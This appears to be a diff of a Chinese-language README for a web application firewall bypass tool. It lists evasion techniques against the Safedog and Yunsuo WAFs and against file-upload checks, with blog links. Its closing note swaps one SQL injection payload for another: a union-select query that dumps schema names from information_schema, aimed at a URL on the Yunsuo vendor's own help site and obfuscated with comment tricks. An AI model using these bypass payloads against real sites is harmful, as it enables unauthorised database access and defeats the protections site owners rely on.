@@ -23,11 +23,13 @@ safedog_upload_huanhang.txt<br>
 ## 利用知识点：<br>
 安全狗：内联注释<br>
 blog:https://pureqh.top/?p=1882<br>
-云锁：引号包裹注释符绕过检测<br>
-blog:https://pureqh.top/?p=4175<br>
+~~云锁：引号包裹注释符绕过检测~~<br>
+~~blog:https://pureqh.top/?p=4175~~<br>
+云锁：内联嵌入特殊字符绕过检测<br>
+blog:https://pureqh.top/?p=4414<br>
 文件上传：Content-Disposition参数溢出、文件名换行绕过<br>
 blog:https://pureqh.top/?p=1225<br>
 
-## 注：bypass云锁 使用双引号可以绕过官网检测
-http://help.yunsuo.com.cn/guide/install/?id=1' "/\*" union select 1,group_concat(schema_name),2,3 from information_schema.schemata -- "\*/"
+## 注：bypass云锁  
+http://help.yunsuo.com.cn/guide/install/?id=1 /*#&*/ union select 1,group_concat(schema_name),2,3 from information_schema.schemata --  
 
